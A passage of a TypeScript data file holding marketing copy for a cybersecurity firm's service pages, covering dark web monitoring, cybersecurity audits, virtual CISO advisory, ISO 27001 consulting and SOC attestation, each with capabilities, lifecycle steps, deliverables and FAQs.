          detail: "Enforce automated takedowns of fraudulent lookalike websites, spoofed corporate login portals, and rogue mobile applications.",
        },
        {
          headline: "Executive & VIP Digital Protection",
          detail: "Monitor personal email addresses, mobile numbers, and residential physical details of C-suite executives and board members.",
        },
      ],
    },
    vectors: [
      {
        category: "Darknet Marketplaces & Underground Forums",
        description: "Infiltrating Russian, Chinese, and English language cybercrime forums, Tor hidden marketplaces, and invite-only breach networks.",
        capabilities: [
          "Monitoring Initial Access Broker (IAB) network listings",
          "Tracking database breach sales mentioning corporate domains",
          "Infostealer log marketplace monitoring (Genesis, Russian Market)",
          "Ransomware cartel 'shame blog' surveillance",
        ],
      },
      {
        category: "Encrypted Messaging Channels (Telegram & Discord)",
        description: "Scraping hundreds of automated cybercrime channels and threat actor discussion hubs.",
        capabilities: [
          "Real-time monitoring of corporate data drop channels",
          "Tracking distribution of combo-lists and cracked credentials",
          "Monitoring activist hacking (hacktivist) targeting chatter",
          "Interception of targeted corporate insider recruitment campaigns",
        ],
      },
      {
        category: "Domain Typosquatting & Brand Impersonation",
        description: "Continuous scanning of global DNS registrations for newly minted lookalike domains intended for phishing.",
        capabilities: [
          "Homoglyph and character substitution domain detection",
          "Active MX record monitoring on suspicious lookalikes",
          "Cloned website code and copyright asset scraping",
          "Global domain registrar takedown enforcement",
        ],
      },
      {
        category: "Public Code Repositories & Leak Sites",
        description: "Monitoring GitHub, GitLab, Pastebin, and cloud storage for leaked source code and API keys.",
        capabilities: [
          "Scraping public GitHub commits for hardcoded corporate tokens",
          "Monitoring accidental upload of AWS/Azure root keys",
          "Tracking paste sites for employee credential dumps",
          "Exposed cloud backup file discovery",
        ],
      },
    ],
    lifecycle: [
      {
        step: "01",
        phase: "Digital Footprint Baseline",
        title: "Asset & Keyword Seeding",
        description: "Cataloging all corporate domain names, executive names, proprietary software names, and corporate email patterns.",
        activities: ["Domain seeding", "Executive identity registration", "Proprietary IP keyword configuration"],
      },
      {
        step: "02",
        phase: "Continuous Multi-Network Scraping",
        title: "Automated Surveillance",
        description: "Our crawler cluster continuously ingests hundreds of gigabytes of underground forum posts, Telegram chats, and paste archives.",
        activities: ["Tor crawler execution", "Telegram API channel ingestion", "Public repository scanning"],
      },
      {
        step: "03",
        phase: "Human Intelligence Triage",
        title: "Analyst Verification & Filtering",
        description: "Dark web analysts manually verify detected leaks, decrypting archives and filtering out outdated historical breach dumps.",
        activities: ["Credential freshness testing", "Archival password deduplication", "True business risk assessment"],
      },
      {
        step: "04",
        phase: "Instant Notification & Active Defense",
        title: "Emergency Alert & Credential Invalidation",
        description: "Alerting your security team within 2 hours of verified credential leak, triggering automated Active Directory password resets.",
        activities: ["Urgent API webhook alert", "SSO session token invalidation", "Identity team phone escalation"],
      },
      {
        step: "05",
        phase: "Takedown & Remediation Enforcement",
        title: "Legal & Domain Eviction",
        description: "Coordinating with global registrars, hosting providers, and cloud CDNs to terminate fraudulent domains and rogue infrastructure.",
        activities: ["Registrar abuse notification", "DMCA and trademark takedowns", "Monthly risk reduction report"],
      },
    ],
    deliverables: [
      {
        title: "Real-Time Dark Web Alert Webhooks",
        format: "API Stream + SMS / Email Alerts",
        audience: "Identity Operations, SOC Analysts",
        description: "Instant notifications containing compromised email, cleartext password hash, breach source, and affected user metadata.",
      },
      {
        title: "Brand Abuse & Takedown Tracker",
        format: "Interactive Dashboard",
        audience: "Legal Counsel, Brand Marketing, CISO",
        description: "Live tracking of all identified typosquatted domains, active phishing sites, and status of global takedown requests.",
      },
      {
        title: "Executive Digital Footprint Audit",
        format: "Confidential Executive PDF",
        audience: "Board of Directors, CEO, VIPs",
        description: "Private audit report detailing personal exposures (passwords, home addresses, phone numbers) of executive leadership.",
      },
    ],
    engagementModels: [
      {
        name: "Continuous 24/7 Dark Web Monitoring Subscription",
        suitableFor: "All modern enterprises protecting employee identities and brand trust",
        description: "Continuous automated surveillance, instant credential alerts, and unlimited typosquatted domain takedowns.",
      },
      {
        name: "Executive & VIP Identity Shield",
        suitableFor: "C-suite executives, high-net-worth board members, and key technical leaders",
        description: "Specialized surveillance covering personal email addresses, family exposures, and targeted doxxing risks.",
      },
      {
        name: "One-Time Historical Brand Compromise Audit",
        suitableFor: "Organizations establishing an initial risk baseline or investigating an active leak",
        description: "Historical retrospective audit identifying all historical corporate credentials circulating on underground markets.",
      },
    ],
    faqs: [
      {
        question: "How quickly do you notify us when our employee credentials appear on the dark web?",
        answer: "Our automated crawlers ingest infostealer dumps and darknet marketplaces in real time. Once verified by our analysts, alerts are dispatched within 2 hours via secure webhooks, email, or telephone for high-privilege executive accounts.",
      },
      {
        question: "Can Envista actually force fraudulent phishing domains to be taken down?",
        answer: "Yes. We maintain established legal and operational relationships with global domain registrars, hosting providers, and certificate authorities. We prepare formal abuse evidence dossiers to ensure malicious lookalikes are suspended rapidly.",
      },
      {
        question: "Do you store or look at plaintext employee passwords?",
        answer: "We treat all intercepted credentials under strict confidentiality protocols. Passwords in alert reports are masked (e.g. `P@ssw****`) and transmitted over encrypted channels directly to authorized identity administrators.",
      },
    ],
  },
];

/* ------------------------------------------------------------------ */
/* Export All Services Unified Registry                               */
/* ------------------------------------------------------------------ */
const GRC_SERVICES: SubServiceDetail[] = [
  {
    "category": "grc",
    "categoryTitle": "GRC Solutions",
    "id": "cybersecurity-audit",
    "slug": "cybersecurity-audit-services",
    "title": "Cybersecurity Audit Services",
    "navTitle": "Cybersecurity Audit Services",
    "badge": "Enterprise Statutory Audits",
    "tagline": "Comprehensive Gap Analysis, Statutory Assurance, and Defense-in-Depth Auditing.",
    "heroSummary": "Thorough statutory and technical cybersecurity audits evaluating your infrastructure, access management, cryptographic controls, and operational workflows against international benchmarks and regulatory mandates.",
    "promise": "100% Audit Readiness with Zero Non-Conformities",
    "metrics": [
      {
        "value": "100%",
        "label": "Audit Pass Rate",
        "sub": "Global accredited bodies"
      },
      {
        "value": "360°",
        "label": "Controls Evaluated",
        "sub": "Technical, physical & administrative"
      },
      {
        "value": "Evidence",
        "label": "Automated Vault",
        "sub": "Continuous audit readiness"
      },
      {
        "value": "CERT-In",
        "label": "Empanelled Practices",
        "sub": "National compliance"
      }
    ],
    "frameworks": [
      "ISO/IEC 27001",
      "NIST CSF 2.0",
      "RBI Cybersecurity Framework",
      "SEBI CSCRF",
      "PCI DSS 4.0"
    ],
    "whyItMatters": {
      "title": "Statutory Compliance Is Your License to Operate",
      "description": "Regulatory penalties for non-compliance can exceed tens of crores, while enterprise clients require rigorous third-party audits before signing master service agreements.",
      "points": [
        {
          "headline": "De-Risk Regulatory Penalties",
          "detail": "Identify and remediate non-conformities before government regulators or statutory auditors discover them."
        },
        {
          "headline": "Accelerate Enterprise Sales",
          "detail": "Shorten vendor security questionnaire cycles by months with a clean, certified third-party audit report."
        },
        {
          "headline": "Continuous Evidence Engineering",
          "detail": "Move from once-a-year chaotic audit scrambles to a continuous, automated compliance posture."
        }
      ]
    },
    "vectors": [
      {
        "category": "Information Security Policy & Architecture Audit",
        "description": "Evaluating your corporate security policies against real operational practices.",
        "capabilities": [
          "Information Security Management System (ISMS) review",
          "Access control & password policy enforcement checks",
          "Asset management & classification tracking",
          "Clear desk & clean screen policy validation"
        ]
      },
      {
        "category": "Network & Perimeter Technical Audit",
        "description": "Inspecting firewall configurations, network segmentation, and remote access safeguards.",
        "capabilities": [
          "Firewall rule base review & optimization",
          "Network topology & DMZ segmentation audit",
          "Remote access & VPN authentication scrutiny",
          "Wireless network security & rogue AP audits"
        ]
      },
      {
        "category": "Cryptographic Controls & Key Management",
        "description": "Validating data encryption standards across data-at-rest and data-in-transit pipelines.",
        "capabilities": [
          "TLS/SSL protocol version & cipher suite validation",
          "Database & storage volume encryption audits",
          "HSM and KMS key rotation lifecycle review",
          "Public Key Infrastructure (PKI) architecture audits"
        ]
      },
      {
        "category": "Physical & Environmental Security Audit",
        "description": "Evaluating physical datacenter, server room, and office access controls.",
        "capabilities": [
          "Biometric & badge access logging audits",
          "CCTV coverage and retention period review",
          "Visitor management & escort policy adherence",
          "Power redundancy (UPS/Generator) & fire suppression checks"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Scoping & Kickoff",
        "title": "Audit Boundary Definition",
        "description": "Mapping systems, business entities, and regulatory requirements in scope.",
        "activities": [
          "Asset list ingestion",
          "Regulatory mapping",
          "Auditee stakeholder scheduling"
        ]
      },
      {
        "step": "02",
        "phase": "Document & Policy Review",
        "title": "Artifact & Control Analysis",
        "description": "Reviewing existing security manuals, incident logs, and architectural diagrams.",
        "activities": [
          "Policy gap benchmarking",
          "Access matrix inspection",
          "Vendor contract review"
        ]
      },
      {
        "step": "03",
        "phase": "Onsite & Technical Testing",
        "title": "Evidence Verification & Sampling",
        "description": "Sampling workstations, servers, and interviewing process owners to verify policy adherence.",
        "activities": [
          "Sample-based control testing",
          "Administrative interviews",
          "Configuration review"
        ]
      },
      {
        "step": "04",
        "phase": "Findings & Remediation Roadmapping",
        "title": "Gap Dossier Delivery",
        "description": "Compiling non-conformities into prioritized remediation playbooks.",
        "activities": [
          "Risk treatment planning",
          "Root cause classification",
          "Executive debrief"
        ]
      },
      {
        "step": "05",
        "phase": "Closure Audit & Certification",
        "title": "Final Assurance Certification",
        "description": "Verifying closed findings and issuing formal compliance audit attestations.",
        "activities": [
          "Remediation re-verification",
          "Final audit report sign-off",
          "Certificate issuance"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Statutory Cybersecurity Audit Report",
        "format": "Comprehensive Formal PDF",
        "audience": "Board of Directors, Regulators, External Auditors",
        "description": "Detailed control-by-control assessment results with non-conformity findings and evidentiary references."
      },
      {
        "title": "Executive Risk & Gap Scorecard",
        "format": "Slide Deck / Executive PDF",
        "audience": "CEO, CISO, Audit Committee",
        "description": "High-level risk maturity scoring across security domains with tactical investment priorities."
      },
      {
        "title": "Certificate of Cybersecurity Compliance",
        "format": "Official Signed Certificate",
        "audience": "Enterprise Clients, Statutory Authorities",
        "description": "Formal attestation verifying that target systems have successfully completed independent third-party audit."
      }
    ],
    "engagementModels": [
      {
        "name": "Comprehensive Annual Statutory Audit",
        "suitableFor": "Regulated banks, NBFCs, fintechs, and listed enterprises",
        "description": "Full-scope audit covering all operational, technical, and governance controls required by law."
      },
      {
        "name": "Pre-Audit Readiness & Mock Assessment",
        "suitableFor": "Enterprises preparing for formal external audits (ISO, SOC, RBI, SEBI)",
        "description": "Rigorous gap assessment identifying red flags and coaching teams prior to official audits."
      },
      {
        "name": "Targeted Third-Party Vendor Security Audit",
        "suitableFor": "Auditing outsourced software developers, cloud providers, and BPOs",
        "description": "Verifying that supply-chain partners maintain equivalent cybersecurity controls."
      }
    ],
    "faqs": [
      {
        "question": "How long does an enterprise cybersecurity audit take from start to finish?",
        "answer": "A typical audit takes 2 to 4 weeks depending on the number of systems, physical locations, and complexity of regulatory mandates in scope."
      },
      {
        "question": "Will our internal IT team be overwhelmed by documentation requests?",
        "answer": "No. Our auditors provide structured evidence request lists, shared secure evidence vaults, and clear guidance, minimizing operational friction for your engineers."
      },
      {
        "question": "Do you assist with remediating the gaps found during the audit?",
        "answer": "Yes. Every audit deliverable includes a prioritized Risk Treatment Plan (RTP) with step-by-step technical instructions on how to close each gap."
      }
    ]
  },
  {
    "category": "grc",
    "categoryTitle": "GRC Solutions",
    "id": "virtual-ciso",
    "slug": "virtual-ciso-services",
    "title": "Virtual CISO (vCISO) Advisory Services",
    "navTitle": "Virtual CISO Services",
    "badge": "Executive Security Leadership",
    "tagline": "Strategic Cyber Leadership, Boardroom Advisory, and Program Governance On-Demand.",
    "heroSummary": "Access elite Chief Information Security Officer leadership on a flexible fractional or dedicated basis. We align security strategy with business growth, lead board risk committees, manage vendor evaluations, and guide crisis responses without the overhead of a full-time executive.",
    "promise": "Boardroom-Ready Cyber Governance & Strategic ROI",
    "metrics": [
      {
        "value": "CXO",
        "label": "Executive Leadership",
        "sub": "Decades of cyber tenure"
      },
      {
        "value": "60%",
        "label": "Cost Reduction",
        "sub": "Compared to full-time CISO"
      },
      {
        "value": "Board",
        "label": "Reporting & Governance",
        "sub": "Quarterly risk presentations"
      },
      {
        "value": "24/7",
        "label": "Escalation Access",
        "sub": "Crisis & regulatory counsel"
      }
    ],
    "frameworks": [
      "NIST Cybersecurity Framework",
      "ISO 27001 ISMS Governance",
      "COBIT 2019",
      "SEBI / RBI Board Mandates"
    ],
    "whyItMatters": {
      "title": "High-Caliber CISO Talent Is Scarce and Expensive",
      "description": "Hiring a full-time CISO takes 6 to 9 months and costs upwards of $300k+/year. A Virtual CISO gives you immediate, battle-tested leadership from day one to guide compliance, pass enterprise audits, and protect brand reputation.",
      "points": [
        {
          "headline": "Boardroom & Stakeholder Confidence",
          "detail": "Provide investors, board members, and clients with seasoned cybersecurity representation in executive meetings."
        },
        {
          "headline": "Strategic Security Roadmap Engineering",
          "detail": "Prioritize cyber investments that directly mitigate business risk and eliminate wasteful tool sprawl."
        },
        {
          "headline": "Crisis Command & Incident Navigation",
          "detail": "Have a seasoned executive ready to command incident response, legal reporting, and customer communications during a breach."
        }
      ]
    },
    "vectors": [
      {
        "category": "Cybersecurity Strategy & Budget Optimization",
        "description": "Aligning technical cyber investments with revenue growth and risk appetite.",
        "capabilities": [
          "3-year strategic cybersecurity roadmap formulation",
          "Vendor selection, tool rationalization, and RFP management",
          "Budget forecasting and security ROI justification for the CFO",
          "Cyber insurance policy adequacy and negotiation support"
        ]
      },
      {
        "category": "Board & Regulatory Governance",
        "description": "Translating complex technical telemetry into clear business and fiduciary risk metrics.",
        "capabilities": [
          "Quarterly Board of Directors cybersecurity presentations",
          "Audit Committee representation and statutory filing guidance",
          "Regulatory interface with RBI, SEBI, CERT-In, and DPDB",
          "Fiduciary risk quantification and compliance tracking"
        ]
      },
      {
        "category": "Security Team Mentorship & Hiring",
        "description": "Building, training, and directing internal security engineering and SOC teams.",
        "capabilities": [
          "Technical interview and hiring guidance for security roles",
          "SOC operational workflow and escalation matrix design",
          "Employee cyber culture and awareness program direction",
          "Key Performance Indicator (KPI) and SLA establishment"
        ]
      },
      {
        "category": "Vendor & Enterprise Client Trust Enablement",
        "description": "Accelerating enterprise sales deals by handling customer security questionnaires and audits.",
        "capabilities": [
          "Direct participation in client security due diligence calls",
          "SOC 2 and ISO 27001 certification program leadership",
          "Third-party risk management (TPRM) framework rollout",
          "Data processing agreement (DPA) security terms negotiation"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Discovery & Maturity Baseline",
        "title": "Enterprise Risk Assessment",
        "description": "Interviewing executive stakeholders, auditing current controls, and establishing a baseline maturity score.",
        "activities": [
          "Stakeholder alignment interviews",
          "Current tool stack inventory",
          "Maturity gap identification"
        ]
      },
      {
        "step": "02",
        "phase": "Strategy & Roadmap Design",
        "title": "Target Architecture Blueprint",
        "description": "Formulating a prioritized 12-to-36 month strategic cyber roadmap approved by executive leadership.",
        "activities": [
          "Policy governance overhaul",
          "Budget calibration",
          "Roadmap board presentation"
        ]
      },
      {
        "step": "03",
        "phase": "Operational Execution & Leadership",
        "title": "Active Program Direction",
        "description": "Directing daily security operations, running risk committee meetings, and overseeing vendor implementations.",
        "activities": [
          "Bi-weekly security standups",
          "Vendor contract approvals",
          "Client questionnaire completion"
        ]
      },
      {
        "step": "04",
        "phase": "Crisis & Incident Standby",
        "title": "Emergency Command & Response",
        "description": "Serving as the lead crisis commander in the event of an active intrusion, extortion attempt, or data leak.",
        "activities": [
          "Incident commander role",
          "Regulatory disclosure management",
          "Post-incident review"
        ]
      },
      {
        "step": "05",
        "phase": "Continuous Assurance & Board Reporting",
        "title": "Sustained Governance",
        "description": "Conducting continuous risk reviews and presenting objective maturity trend graphs to the Board.",
        "activities": [
          "Quarterly board slide preparation",
          "Audit readiness sign-off",
          "Continuous strategy tuning"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Strategic Cybersecurity Roadmap",
        "format": "Executive Presentation & Playbook",
        "audience": "Board of Directors, CEO, CTO",
        "description": "Multi-year phased security program detailing budget allocations, control milestones, and business value metrics."
      },
      {
        "title": "Quarterly Board Risk Dossier",
        "format": "High-Level Slide Deck",
        "audience": "Board of Directors, Audit Committee",
        "description": "Executive briefing translating enterprise cyber posture, threat trends, and compliance metrics into plain business language."
      },
      {
        "title": "Enterprise Security Policy Architecture",
        "format": "Comprehensive Policy Suite (Word/PDF)",
        "audience": "All Employees, Enterprise Auditors",
        "description": "Complete set of modern corporate security policies (Access Control, Incident Response, Cryptography, BCP/DR)."
      }
    ],
    "engagementModels": [
      {
        "name": "Fractional Executive Retainer",
        "suitableFor": "Growing enterprises needing 2 to 4 days of executive leadership per month",
        "description": "Strategic guidance, board representation, policy approvals, and client security due diligence calls."
      },
      {
        "name": "Interim CISO Leadership",
        "suitableFor": "Enterprises navigating a CISO transition or major post-breach transformation",
        "description": "Dedicated 3-to-6 month hands-on leadership managing security operations during full-time executive recruitment."
      },
      {
        "name": "Certification Program Leadership (ISO / SOC 2)",
        "suitableFor": "Startups and scale-ups achieving their first major enterprise security certification",
        "description": "Direct project management leading all technical teams through successful certification audits."
      }
    ],
    "faqs": [
      {
        "question": "Can a Virtual CISO attend enterprise customer sales calls to discuss security?",
        "answer": "Yes! One of the highest-ROI benefits of our vCISO service is having an authoritative executive join vendor security review calls with your enterprise prospects, drastically shortening sales cycles."
      },
      {
        "question": "How does a vCISO interact with our existing internal IT and engineering teams?",
        "answer": "Our vCISO acts as an executive partner and mentor, providing high-level direction, approving architectures, and prioritizing tasks for your existing engineers without micromanagement."
      },
      {
        "question": "What happens if we experience a security breach while working with a vCISO?",
        "answer": "Your assigned vCISO serves as your primary incident commander, stepping in immediately to lead containment efforts, coordinate with forensic investigators, and handle required regulatory disclosures."
      }
    ]
  },
  {
    "category": "grc",
    "categoryTitle": "GRC Solutions",
    "id": "iso-27001",
    "slug": "iso-27001-consulting",
    "title": "ISO 27001:2022 Consulting & Certification",
    "navTitle": "ISO 27001 Consulting",
    "badge": "Global ISMS Standard",
    "tagline": "Achieve and Maintain Accredited ISO/IEC 27001:2022 Certification with Zero Non-Conformities.",
    "heroSummary": "End-to-end consulting for the world's leading information security management system (ISMS) standard. We handle gap analyses, Statement of Applicability (SoA) drafting, risk treatment plans, internal audits, and external representation during Stage 1 and Stage 2 certification audits.",
    "promise": "Turnkey ISO 27001:2022 Certification Guarantee",
    "metrics": [
      {
        "value": "100%",
        "label": "First-Attempt Pass Rate",
        "sub": "Global accredited registrars"
      },
      {
        "value": "2022",
        "label": "Updated Controls Ready",
        "sub": "Threat intel & cloud controls"
      },
      {
        "value": "93",
        "label": "Annex A Controls Mapped",
        "sub": "Comprehensive coverage"
      },
      {
        "value": "< 90 Days",
        "label": "Fast-Track Pathway",
        "sub": "Structured project delivery"
      }
    ],
    "frameworks": [
      "ISO/IEC 27001:2022",
      "ISO/IEC 27002:2022",
      "ISO/IEC 27701 (Privacy)",
      "ISO 22301 (BCP)"
    ],
    "whyItMatters": {
      "title": "ISO 27001 Is the Universal Currency of Enterprise Trust",
      "description": "Without accredited ISO 27001 certification, global enterprises, financial institutions, and government bodies will simply disqualify your bids during procurement security vetting.",
      "points": [
        {
          "headline": "Win Global Enterprise Contracts",
          "detail": "Meet the non-negotiable security prerequisite demanded by Fortune 500 procurement teams worldwide."
        },
        {
          "headline": "Streamline Information Security Governance",
          "detail": "Replace ad-hoc security measures with a structured, repeatable, risk-based management system."
        },
        {
          "headline": "Upgrade to the Modern 2022 Standard",
          "detail": "Seamlessly transition from legacy 2013 standards to the 2022 version incorporating threat intelligence and cloud controls."
        }
      ]
    },
    "vectors": [
      {
        "category": "Gap Analysis & Scope Boundary Definition",
        "description": "Benchmarking current operations against ISO 27001:2022 Clauses 4 through 10 and Annex A controls.",
        "capabilities": [
          "ISMS scope definition across entities and cloud environments",
          "Clause 4-10 organizational requirements benchmarking",
          "Current technical control baseline evaluation",
          "Executive gap analysis roadmap generation"
        ]
      },
      {
        "category": "Risk Assessment & Statement of Applicability (SoA)",
        "description": "Executing formal risk identification, evaluation, and documentation across all enterprise assets.",
        "capabilities": [
          "Asset-based and scenario-based risk assessment methodology",
          "Risk Treatment Plan (RTP) formulation",
          "Statement of Applicability (SoA) authoring across all 93 controls",
          "Control justification and exclusion rationale documentation"
        ]
      },
      {
        "category": "ISMS Policy Suite & Evidence Vault Engineering",
        "description": "Drafting compliant, realistic operational policies and configuring evidence collection.",
        "capabilities": [
          "Authoring 20+ mandatory operational security policies",
          "Configuring automated evidence collection in compliance platforms",
          "Access control, change management, and cryptography procedures",
          "Third-party vendor risk policy drafting"
        ]
      },
      {
        "category": "Internal Audit & Stage 1/Stage 2 Representation",
        "description": "Executing mandatory internal audits and guiding teams through external registrar audits.",
        "capabilities": [
          "Exhaustive pre-certification internal audit execution",
          "Management Review Meeting (MRM) facilitation",
          "Direct representation during Stage 1 documentation review",
          "Stage 2 onsite/remote audit coaching and non-conformity defense"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Scoping & Gap Assessment",
        "title": "Baseline Evaluation",
        "description": "Defining ISMS organizational boundaries and identifying missing technical and administrative controls.",
        "activities": [
          "Scope sign-off",
          "Gap analysis interviews",
          "Project timeline baseline"
        ]
      },
      {
        "step": "02",
        "phase": "Risk Assessment & SoA",
        "title": "Risk Treatment Planning",
        "description": "Conducting formal risk assessments across all systems and drafting the definitive Statement of Applicability.",
        "activities": [
          "Risk register compilation",
          "SoA authoring",
          "Risk treatment approvals"
        ]
      },
      {
        "step": "03",
        "phase": "Policy Rollout & Control Implementation",
        "title": "Operationalizing Controls",
        "description": "Assisting your engineering, HR, and IT teams with deploying missing controls and documenting evidence.",
        "activities": [
          "Policy suite publication",
          "Staff awareness training",
          "Evidence collection setup"
        ]
      },
      {
        "step": "04",
        "phase": "Internal Audit & Management Review",
        "title": "Pre-Audit Dress Rehearsal",
        "description": "Conducting an independent, rigorous internal audit and facilitating the formal Management Review Meeting.",
        "activities": [
          "Internal audit execution",
          "Corrective action plan rollout",
          "Management review sign-off"
        ]
      },
      {
        "step": "05",
        "phase": "External Certification & Award",
        "title": "Stage 1 & Stage 2 Success",
        "description": "Representing your company during the external registrar's audits and ensuring certificate issuance.",
        "activities": [
          "Stage 1 audit defense",
          "Stage 2 audit representation",
          "Certificate delivery"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Statement of Applicability (SoA) & Risk Register",
        "format": "Excel / Interactive Portal Document",
        "audience": "External Auditors, CISO, Management",
        "description": "Formal matrix documenting the status, justification, and implementation evidence for all 93 Annex A controls."
      },
      {
        "title": "Complete ISMS Policy & Procedure Suite",
        "format": "20+ Standardized Word/PDF Policies",
        "audience": "All Employees, Compliance Auditors",
        "description": "Tailored operational policies covering Access Control, Incident Response, Cryptography, BCP, and Remote Work."
      },
      {
        "title": "Internal Audit & Management Review Report",
        "format": "Formal Compliance PDF",
        "audience": "Certification Body Registrars",
        "description": "Official documentation proving successful completion of mandatory internal audits and executive review meetings."
      }
    ],
    "engagementModels": [
      {
        "name": "Turnkey ISO 27001 Implementation",
        "suitableFor": "Organizations seeking end-to-end guidance from zero to certified",
        "description": "Complete policy authoring, risk assessment, internal audit, and external certification representation."
      },
      {
        "name": "ISO 27001:2013 to 2022 Transition Consulting",
        "suitableFor": "Enterprises already certified under the 2013 version needing 2022 renewal",
        "description": "Focused delta gap assessment, restructuring to 93 controls, and updating policies for new controls."
      },
      {
        "name": "Mandatory Annual Internal Audit as a Service",
        "suitableFor": "Certified companies needing an independent third-party internal audit annually",
        "description": "Independent execution of the mandatory Clause 9.2 internal audit with comprehensive reporting."
      }
    ],
    "faqs": [
      {
        "question": "What is the difference between ISO 27001:2013 and ISO 27001:2022?",
        "answer": "The 2022 revision consolidated Annex A controls from 114 down to 93, categorized into 4 themes (Organizational, People, Physical, Technological), and introduced 11 brand-new controls including Threat Intelligence, Cloud Services Security, and Data Masking."
      },
      {
        "question": "How long is an ISO 27001 certificate valid for?",
        "answer": "An ISO 27001 certificate is valid for 3 years, subject to successful annual surveillance audits in Year 1 and Year 2 to prove continuous compliance."
      },
      {
        "question": "Can we use automated compliance software like Vanta, Drata, or Sprinto?",
        "answer": "Yes! We regularly implement ISO 27001 alongside compliance automation platforms, configuring integrations, validating evidence, and handling auditor interviews."
      }
    ]
  },
  {
    "category": "grc",
    "categoryTitle": "GRC Solutions",
    "id": "soc-certification",
    "slug": "soc-certification-services",
    "title": "SOC 1, SOC 2 & SOC 3 Attestation Services",
    "navTitle": "SOC Certification Services (SOC 1 2 & 3)",
    "badge": "Trust Services Criteria",
    "tagline": "Achieve Unquestioned Customer Trust with Independent SOC 2 Type I & Type II Attestations.",
    "heroSummary": "End-to-end preparation, control engineering, evidence automation, and audit defense for SOC 1 (SSAE 18), SOC 2 (Type I & Type II), and SOC 3 attestations. We align your systems with AICPA Trust Services Criteria (Security, Availability, Confidentiality, Processing Integrity, Privacy).",
    "promise": "Seamless AICPA SOC 2 Type II Attestation Delivery",
    "metrics": [
      {
        "value": "Type I & II",
        "label": "Full Report Coverage",
        "sub": "Point-in-time & 6-12 month"
      },
      {
        "value": "5 TSC",
        "label": "Trust Services Criteria",
        "sub": "Security to Privacy"
      },
      {
        "value": "CPA",
        "label": "Accredited Partners",
        "sub": "Top-tier audit firms"
      },
      {
        "value": "0",
        "label": "Qualified Opinions",
        "sub": "Clean audit attestations"
      }
    ],
    "frameworks": [
      "AICPA Trust Services Criteria (TSC)",
      "SSAE 18 / ISAE 3402",
      "Cloud Security Alliance (CSA)",
      "COSO Framework"
    ],
    "whyItMatters": {
      "title": "North American Enterprise Buyers Demand SOC 2 Type II",
      "description": "If you sell B2B SaaS or cloud solutions to US or global enterprises, a SOC 2 Type II report is non-negotiable. Without it, enterprise procurement processes will stall indefinitely.",
      "points": [
        {
          "headline": "Unblock High-Value SaaS Enterprise Deals",
          "detail": "Satisfy vendor risk assessments instantly by presenting an independent CPA-signed SOC 2 Type II report."
        },
        {
          "headline": "Prove Operational Rigor Over Time",
          "detail": "A Type II report demonstrates that your security controls operated effectively over a 6 to 12 month evaluation window."
        },
        {
          "headline": "Comprehensive Coverage Beyond Technical Controls",
          "detail": "Validate internal controls governing financial reporting (SOC 1), security (SOC 2), and public trust (SOC 3)."
        }
      ]
    },
    "vectors": [
      {
        "category": "Trust Services Criteria (TSC) Scoping",
        "description": "Aligning your cloud platform against the 5 AICPA Trust Services Categories.",
        "capabilities": [
          "Common Criteria (Security / CC-Series) baseline mapping",
          "Availability & disaster recovery criteria integration",
          "Confidentiality & sensitive data segregation checks",
          "Processing Integrity and Privacy criteria customization"
        ]
      },
      {
        "category": "Control Design & Evidence Automation",
        "description": "Translating engineering workflows into auditable, continuous control proofs.",
        "capabilities": [
          "CI/CD pull request review and automated testing controls",
          "IAM access provisioning, quarterly user access reviews, and MFA",
          "Vulnerability management SLAs and penetration test tracking",
          "Incident response and change management evidence logs"
        ]
      },
      {
        "category": "SOC 1 (Financial Controls / SSAE 18)",
        "description": "Auditing Internal Controls over Financial Reporting (ICFR) for payroll, fintech, and accounting platforms.",
        "capabilities": [
          "Financial transaction reconciliation controls",
          "Batch processing integrity and exception logging",
          "Segregation of duties (SoD) in ERP and financial backends",
          "IT General Controls (ITGC) supporting financial systems"
        ]
      },
      {
        "category": "Auditor Defense & CPA Coordination",
        "description": "Representing your engineering teams directly during external CPA audits.",
        "capabilities": [
          "CPA selection and audit scheduling coordination",
          "Evidence package pre-validation to prevent exceptions",
          "Direct participation in auditor walkthrough sessions",
          "Management Representation Letter (MRL) review"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Scoping & Readiness Assessment",
        "title": "Criteria Mapping",
        "description": "Determining applicable Trust Services Criteria (TSC), system boundaries, and running an initial readiness gap assessment.",
        "activities": [
          "TSC category selection",
          "System description (Section 3) drafting",
          "Readiness gap report"
        ]
      },
      {
        "step": "02",
        "phase": "Remediation & Evidence Engineering",
        "title": "Closing Control Gaps",
        "description": "Deploying missing controls such as automated quarterly access reviews, branch protection rules, and vendor evaluations.",
        "activities": [
          "Policy publication",
          "Branch protection enforcement",
          "Automated compliance tool setup"
        ]
      },
      {
        "step": "03",
        "phase": "SOC 2 Type I Attestation",
        "title": "Point-in-Time Certification",
        "description": "Undergoing a Type I audit to verify that controls are designed appropriately as of a specific date.",
        "activities": [
          "CPA evidence submission",
          "Auditor interviews",
          "Type I report issuance"
        ]
      },
      {
        "step": "04",
        "phase": "Observation Period Monitoring (Type II)",
        "title": "Continuous Operating Effectiveness",
        "description": "Maintaining evidence discipline over the 3, 6, or 12 month observation window to ensure zero control lapses.",
        "activities": [
          "Quarterly access review reminders",
          "Automated evidence tracking",
          "Interim sampling reviews"
        ]
      },
      {
        "step": "05",
        "phase": "Final Type II Audit & Report Issuance",
        "title": "Final Attestation Delivery",
        "description": "Submitting the full observation period evidence vault to the independent CPA firm for final report delivery.",
        "activities": [
          "Final evidence submission",
          "CPA walkthrough defense",
          "Clean Type II report issuance"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Independent Service Auditor's Report (SOC 2 Type II)",
        "format": "Official CPA-Signed 50+ Page PDF",
        "audience": "Enterprise Enterprise Prospects, Enterprise Customers, Regulators",
        "description": "Authoritative CPA-signed attestation containing Section 1 (Auditor Opinion), Section 2 (Management Assertion), Section 3 (System Description), and Section 4 (Control Tests & Results)."
      },
      {
        "title": "SOC 3 Public Summary Report",
        "format": "Public Marketing PDF",
        "audience": "Public Website Visitors, Prospective Customers",
        "description": "High-level summary of the SOC 2 report without confidential infrastructure details, suitable for public website download."
      },
      {
        "title": "System Description (Section 3) Master Document",
        "format": "Comprehensive Architectural Document",
        "audience": "AICPA Auditors",
